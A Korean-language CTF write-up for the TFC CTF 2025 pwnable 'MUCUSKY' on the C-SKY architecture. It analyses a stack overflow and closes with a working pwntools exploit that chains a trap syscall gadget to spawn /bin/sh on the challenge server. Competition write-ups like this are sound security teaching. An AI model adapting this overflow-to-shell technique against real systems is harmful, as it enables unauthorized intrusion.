---
title: TFC CTF 2025 Pwnable Writeup (MUCUSKY)
published: 2025-09-20 01:30:00 +09:00
description: "Pwnable Writeup"
tags: ["CTF", "Pwnable", "Writeup"]
image: ./title.png

category: CTF
draft: false
---

# TFC CTF 2025

이번 글은 얼마전 열린 CTF에 대한 포너블 라이트업이 되겠네요. 밀린 Writeup이 많긴한데 TFC CTF를 시작으로 밀린 것들을 모두 올려볼 예정입니당.

# Intro

<p align="center"><img src="/assets/img/TFC-CTF-2025/mucusky.png"></p>

`MUCUSKY`는 `C-SKY` 아키텍처에서 공격을 수행하는 문제였습니다. 생소한 아키텍처긴 했지만, 바이너리 자체는 공부해보면 금방 풀 수 있었습니다.

# C-SKY

`C-SKY`는 중국에서 개발한 CPU 아키텍처 중 하나입니다. 정보가 그~렇게 많지는 않은데, 일단 <a href="https://github.com/c-sky">`github repo`</a>가 존재하기 때문에 필요한 것들은 갖춘 편이었습니다. 바이너리를 익스플로잇하는데에 당장에 필요했던 건 해당 아키텍처에 대한 명령셋 이해정도?면 충분했습니다.

# Analysis (Static, Dynamic)

파일은 대충 요런 파일들이 제공됩니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/files.png"></p>

바이너리 정보를 확인해보면 32bit C-SKY 아키텍처고 `static` 빌드 상태 및 심볼이 빠져있다는 것을 알 수 있습니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/bin_info.png"></p>

한번 실행시켜보면 문자열을 입력받고 뭔가 오염시킬 수 있을 듯한 뉘앙스를 풍기면서 터져버립니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/bang.png"></p>

이제 디컴파일을 위해 `ghidra`를 사용해줍니다. 아키텍처가 워낙 특이하다보니 `ghidra`의 `extension`을 활용해줍시다. 
<p align="center"><img src="/assets/img/TFC-CTF-2025/ghidra_csky.png"></p>

까보면 입력 부분에서 오버플로우가 발생한다는 것을 알 수 있습니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/ghidra_analysis1.png"></p>

`gdb`로 확인해보면 리턴 값이 담길 `r15`와 `r8` 역시 오염된다는 사실을 알 수 있습니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/csky-gdb1.png"></p>

# Exploit

이제 위에서의 간단한 오버플로우로 리턴 주소 및 레지스터 정보가 오염된다는 사실을 이용하면 됩니다. 이때, static 바이너리기 때문에 적절한 가젯을 바이너리 내부에서 찾아야하는데, 마침 `c-sky`에서 시스템 콜에 해당하는 `trap` 명령이 프로그램의 입력과 출력을 위해 존재합니다.

`0x818e`에서 `rts` 명령어로 점프하는 시점에서 `r8`과 `r15` 조작이 가능합니다. 이를 이용해서 시스템 콜을 수행하려면 다음과 같은 구간을 활용하면 됩니다.

<p align="center"><img src="/assets/img/TFC-CTF-2025/ghidra_analysis2.png"></p>

현재 페이로드가 담긴 스택 주소를 알고있다면, 해당 부분에서 역참조되는 `r8`의 주소를 조작해서 스택에 존재하는 값을 원하는 레지스터로 밀어넣을 수 있습니다. 결과적으로 원하는 인자를 레지스터로 설정해서 시스템 콜을 수행할 수 있게됩니다.

스택에 페이로드를 다음과 같이 구성해줍니다.
<p align="center"><img src="/assets/img/TFC-CTF-2025/payload.png"></p>

 `0x8250`의 `trap`으로 `/bin/sh`가 실행됩니다. 최종 공격 코드는 다음과 같습니다.

```python
from pwn import *

# ncat --ssl mucusuki-c9b67a4d63fe2205.challs.tfcctf.com 1337
p = remote('mucusuki-c9b67a4d63fe2205.challs.tfcctf.com', 1337, ssl=True)

STACK = 0x3ffffecc + 0x10

payload = p32(0x0)
payload += p32(STACK+8)
payload += p32(STACK)
payload += p32(221+21) # 221
payload += b'/bin/sh\x00'
payload += p32(STACK)
payload += b'\x00'*72
payload += p32(STACK) # STACK
payload += p32(0x822e) # RET

import time
time.sleep(5)
p.send(payload)

p.interactive()
```

`TFCCTF{t0_beat_mcsky_y0u_had_to_csky_now_go_after_cromozominus}`

끝!